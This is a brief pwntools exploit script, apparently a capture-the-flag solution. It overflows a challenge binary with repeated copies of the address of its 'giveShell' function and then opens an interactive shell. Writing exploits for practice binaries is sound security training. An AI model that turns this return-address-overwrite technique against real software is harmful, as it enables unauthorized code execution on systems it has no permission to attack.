from pwn import *

e = ELF('./chall-test_tu18-shella-hard')
r = e.process()

payload = ''
payload += p32(e.sym.giveShell+5) * 6

r.sendline(payload)
r.interactive()
